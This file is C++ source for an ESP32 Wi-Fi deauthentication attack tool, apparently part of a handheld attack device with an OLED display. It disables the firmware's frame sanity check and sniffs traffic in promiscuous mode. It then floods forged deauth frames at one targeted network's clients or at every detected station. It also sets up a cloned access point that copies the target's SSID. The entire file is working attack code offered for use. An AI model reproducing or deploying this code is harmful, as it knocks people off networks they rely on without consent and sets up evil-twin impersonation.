#include "attacks/deauth.h"
#include "utils/display.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include <string>
#include <vector>

deauth_frame_t deauth_frame;
int deauth_type = DEAUTH_TYPE_SINGLE;
int eliminated_stations;
int wifi_number;
uint16_t reason;

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3)
{
    return 0;
}

esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);

IRAM_ATTR void sniffer(void *buf, wifi_promiscuous_pkt_type_t type)
{
    const wifi_promiscuous_pkt_t *raw_packet = (wifi_promiscuous_pkt_t *)buf;
    const wifi_packet_t *packet = (wifi_packet_t *)raw_packet->payload;
    const mac_hdr_t *mac_header = &packet->hdr;

    // const uint16_t packet_length = raw_packet->rx_ctrl.sig_len - sizeof(mac_hdr_t);

    // if (packet_length < 0)
    //     return;

    // bool sent = false;
    if (deauth_type == DEAUTH_TYPE_SINGLE)
    {
        if (memcmp(mac_header->dest, deauth_frame.sender, 6) == 0)
        {
            memcpy(deauth_frame.station, mac_header->src, 6);
            for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++)
                esp_wifi_80211_tx(WIFI_IF_AP, &deauth_frame, sizeof(deauth_frame), false);
            eliminated_stations++;
            // sent = true;
        }
        else
            return;
    }
    else
    {
        if ((memcmp(mac_header->dest, mac_header->bssid, 6) == 0) && (memcmp(mac_header->dest, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) != 0))
        {
            memcpy(deauth_frame.station, mac_header->src, 6);
            memcpy(deauth_frame.access_point, mac_header->dest, 6);
            memcpy(deauth_frame.sender, mac_header->dest, 6);
            for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++)
                esp_wifi_80211_tx(WIFI_IF_STA, &deauth_frame, sizeof(deauth_frame), false);
            // sent = true;
        }
        else
            return;
    }

    Serial.printf_P(
        PSTR("Send %d Deauth-Frames to: %02X:%02X:%02X:%02X:%02X:%02X\n"),
        NUM_FRAMES_PER_DEAUTH,
        mac_header->src[0], mac_header->src[1], mac_header->src[2],
        mac_header->src[3], mac_header->src[4], mac_header->src[5]);
    //   BLINK_LED(DEAUTH_BLINK_TIMES, DEAUTH_BLINK_DURATION);
}

bool init_deauth(int target_wifi_number, int attack_type, uint16_t reason_p)
{
    deauth_type = attack_type;
    wifi_number = target_wifi_number;
    reason = reason_p;
    return true;
}

void start_deauth()
{
    eliminated_stations = 0;
    deauth_frame.reason = reason;
    if (deauth_type == DEAUTH_TYPE_SINGLE)
    {
        // replica the original wifi
        String ssid = WiFi.SSID(wifi_number);
        String pass = "fakeap";
        Serial.print("Start Deauth-Attack on network: ");
        Serial.print(WiFi.SSID(wifi_number));
        WiFi.softAP(ssid, pass, WiFi.channel(wifi_number));
        memcpy(deauth_frame.access_point, WiFi.BSSID(wifi_number), 6);
        memcpy(deauth_frame.sender, WiFi.BSSID(wifi_number), 6);
    }
    else
    {
        Serial.println("Starting Deauth-Attack on all detected stations!");
        WiFi.softAPdisconnect();
        WiFi.mode(WIFI_MODE_STA);
    }

    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous_rx_cb(&sniffer);

    display.clearDisplay();
    display.setCursor(0, 15);
    display.print(F("TARGET: "));
    display.println(ap.ssid.substring(0, 15));

    display.drawRoundRect(5, 28, 118, 32, 4, SSD1306_WHITE);
    display.setTextSize(2);
    display.setCursor(15, 38);
    display.print(F("SENT: "));
    display.print(eliminated_stations);

    display.setTextSize(1);
    if ((millis() / 500) % 2 == 0)
    {
        display.fillRect(100, 15, 25, 10, SSD1306_WHITE);
        display.setTextColor(SSD1306_BLACK);
        display.setCursor(102, 16);
        display.print(F("TX"));
        display.setTextColor(SSD1306_WHITE);
    }
    display.display();
}

void stop_deauth()
{
    Serial.println("Stopping Deauth-Attacck...");
    esp_wifi_set_promiscuous(false);
}

void perform_deauth()
{
    // empty as per working deauth, channel is fixed
}
